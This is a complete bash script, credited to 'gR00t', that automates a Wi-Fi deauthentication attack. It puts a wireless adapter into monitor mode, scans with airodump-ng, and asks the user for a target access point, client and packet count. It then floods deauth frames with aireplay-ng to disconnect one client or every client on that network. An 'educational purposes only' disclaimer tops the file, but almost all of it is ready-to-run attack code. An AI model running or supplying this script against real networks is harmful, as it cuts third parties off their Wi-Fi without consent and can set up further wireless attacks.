#!/bin/bash

# Developed by gR00t
# WARNING: This script is intended for educational purposes only.
# Unauthorized use may be illegal and unethical.

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global variables
adapter=""
pid=""

# Function to display adapter options and let user choose
choose_adapter() {
    echo -e "${BLUE}Available network adapters:${NC}"
    sudo ifconfig | grep -E '^[a-zA-Z0-9]+:'
    echo ""

    echo -e "${YELLOW}Choose the adapter you want to use:${NC}"
    read adapter
}

# Function to set up the adapter for monitor mode
setup_monitor_mode() {
    echo -e "${RED}Stopping NetworkManager and wpa_supplicant...${NC}"
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant

    echo -e "${GREEN}Setting up adapter $adapter in monitor mode...${NC}"
    sudo ip link set $adapter down
    sudo iw dev $adapter set type monitor
    sudo ip link set $adapter up
}

# Function to start airodump-ng in a new terminal and collect information
start_airodump() {
    echo -e "${YELLOW}Opening new terminal for scanning on $adapter...${NC}"
    gnome-terminal -- bash -c "sudo airodump-ng $adapter; echo 'Scan terminated. Press Enter to close this terminal.'; read" &

    # Record the PID of airodump-ng process to be used later for killing
    pid=$!
}

# Function to process airodump-ng output and select targets
choose_targets() {
    echo -e "${BLUE}Enter the BSSID of the target network:${NC}"
    read TARGET_BSSID

    echo -e "${BLUE}Enter the MAC address of the client to deauth (leave blank for all clients):${NC}"
    read TARGET_MAC

    echo -e "${BLUE}Enter the channel number for the target network:${NC}"
    read CHANNEL

    echo -e "${BLUE}Enter the number of deauth packets to send:${NC}"
    read PACKETS

    # Confirm details with user
    echo ""
    echo -e "${RED}You are about to perform a deauth attack with the following details:${NC}"
    echo -e "${YELLOW}Target BSSID: $TARGET_BSSID${NC}"
    echo -e "${YELLOW}Target MAC: $TARGET_MAC${NC}"
    echo -e "${YELLOW}Channel: $CHANNEL${NC}"
    echo -e "${YELLOW}Number of packets: $PACKETS${NC}"
    echo ""
    read -p "Do you want to continue? (y/n): " confirmation

    if [[ $confirmation != "y" ]]; then
        echo -e "${RED}Operation cancelled.${NC}"
        exit 0
    fi
}

# Function to perform the deauthentication attack
perform_deauth_attack() {
    # Set the channel
    sudo iwconfig $adapter channel $CHANNEL

    # Run the deauth attack
    if [ -z "$TARGET_MAC" ]; then
        echo -e "${GREEN}Performing deauthentication attack on all clients...${NC}"
        sudo aireplay-ng --deauth $PACKETS -a $TARGET_BSSID $adapter
    else
        echo -e "${GREEN}Performing deauthentication attack on client $TARGET_MAC...${NC}"
        sudo aireplay-ng --deauth $PACKETS -a $TARGET_BSSID -c $TARGET_MAC $adapter
    fi

    echo -e "${GREEN}Deauth attack completed.${NC}"
}

# Function to restart NetworkManager and wpa_supplicant
restart_services() {
    echo -e "${RED}Starting NetworkManager and wpa_supplicant...${NC}"
    sudo systemctl start NetworkManager
    sudo systemctl start wpa_supplicant
}

# Function to restore network adapter state
cleanup() {
    echo -e "${RED}Restoring network adapter state...${NC}"
    sudo ip link set $adapter down
    sudo iw dev $adapter set type managed
    sudo ip link set $adapter up
    restart_services
}

# Trap to ensure cleanup is executed on script exit
trap cleanup EXIT

# Main script execution
choose_adapter
setup_monitor_mode
start_airodump
choose_targets
perform_deauth_attack

# Clean up airodump-ng process if it is still running
echo -e "${RED}Terminating airodump-ng process...${NC}"
kill $pid

